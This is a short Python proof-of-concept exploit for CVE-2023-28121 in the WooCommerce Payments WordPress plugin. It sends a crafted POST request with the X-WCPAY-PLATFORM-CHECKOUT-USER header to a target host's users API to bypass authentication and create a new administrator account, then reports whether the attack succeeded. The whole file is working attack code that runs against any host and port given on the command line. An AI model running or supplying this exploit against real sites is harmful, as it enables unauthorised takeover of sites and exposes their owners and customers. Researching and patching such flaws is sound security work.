import json

from urllib import request, parse, error

import argparse

parser = argparse.ArgumentParser(description="WooCommerce Payments =< 5.6.1 CVE-2023-28121 PoC. Reference: https://www.rcesecurity.com/2023/07/patch-diffing-cve-2023-28121-to-compromise-a-woocommerce/")
parser.add_argument("RHOST", type=str, help="remote host")
parser.add_argument("RPORT", type=str, help="remote port")
parser.add_argument("-v", "--version", action="version", version="1.0")
args = parser.parse_args()

data = {
  "email": "own@e.d",
  "username": "dolly",
  "password": "1337",
  "roles": ["administrator"]
}

data = json.dumps(data).encode()

req = request.Request(f"http://{args.RHOST}:{args.RPORT}/wp-json/wp/v2/users", data=data, method="POST")
req.add_header("Content-Type", "application/json")
req.add_header("X-WCPAY-PLATFORM-CHECKOUT-USER", "1")

try:
  r = request.urlopen(req)

  print("[+] success: exploit executed...") if r.getcode() == 201 else print("[-] error: failed to execute exploit, exiting...")
except Exception as e:
  print("[-] error: request not valid, exiting...", e)